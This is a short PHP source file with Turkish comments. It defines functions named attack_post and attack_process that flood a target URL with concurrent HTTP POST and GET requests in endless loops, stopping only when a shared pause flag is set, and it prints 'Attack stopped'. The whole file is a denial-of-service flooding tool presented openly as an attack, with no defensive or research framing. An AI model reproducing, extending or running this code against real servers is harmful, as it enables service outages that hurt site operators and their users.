<?php




function attack_post($url, $amount, $response, $table, $data) {
    while(true){
    // cURL multi-handle başlat
    $mh = curl_multi_init();
    $curlHandles = [];
    $data2 = ['victim' => $data];
    // Her veri seti için bir cURL oturumu oluştur ve ayarla

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data2));
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        curl_multi_add_handle($mh, $ch);
        $curlHandles[] = $ch;
    
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);
}

}


function attack_process($url, $amount, $response, $table)
{
    
    $mh = curl_multi_init();
    
    while (true) {
        
        if ($table->get('duraklat', 'duraklat') ==1) break;
        $chArray = [];
        for ($i = 0; $i < $amount; $i++) {
            
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_multi_add_handle($mh, $ch);
            $chArray[] = $ch;
        }
        $active = null;
        do {
            if ($table->get('duraklat', 'value') ===1) break;
           
            $status = curl_multi_exec($mh, $active);
        } while ($status === CURLM_CALL_MULTI_PERFORM || $active);

        
    }
    echo "Attack stopped\n";

}
?>
